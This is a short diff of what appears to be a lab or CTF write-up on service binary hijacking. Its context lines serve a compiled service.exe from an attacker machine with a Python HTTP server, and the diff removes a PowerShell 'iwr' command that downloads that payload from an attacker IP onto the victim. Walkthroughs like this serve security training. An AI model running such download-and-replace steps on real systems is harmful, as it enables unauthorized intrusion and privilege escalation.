@@ -268,9 +268,6 @@ mcs service.cs
 python3 -m http.server 80
 ```
 Now we can download the file from the victim machine, while we do that we can also remove the existing service binary:
-```powershell
-iwr http://10.8.79.118/service.exe -o spoofer-scheduler.exe
-```
 	
 ![binary manipulation](./pic/service_binary.png)
 	
